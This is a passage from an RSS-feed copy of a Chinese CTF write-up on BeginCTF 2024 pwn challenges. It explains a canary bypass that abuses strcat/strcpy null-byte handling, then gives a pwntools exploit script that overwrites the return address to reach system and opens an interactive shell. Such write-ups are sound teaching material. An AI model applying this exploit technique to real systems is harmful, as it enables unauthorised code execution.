   pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h3><p>strcat会在字符串后面继续添加字符串，strcpy在复制字符串后会自动加’\0’,利用这两个特性，在vul函数中先将canary的最低位字节\x00覆盖掉，然后strcat就可以绕过canary修改返回地址，最后strcpy会将canary最后一字节恢复为\x00,程序结束返回system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line">    libc=ELF(<span class="string">&quot;/home/feichai/ctf_file/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x4011FE</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">2</span> + p64(system)</span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x39</span></span><br><span class="line">    p.sendafter(<span class="string">b&quot;read:&quot;</span>,pd)</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="http://example.com/categories/write-up/">write up</category>
      
      
      
      <comments>http://example.com/2024/02/06/BeginCTF-2024-Pwn%E9%83%A8%E5%88%86wp/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
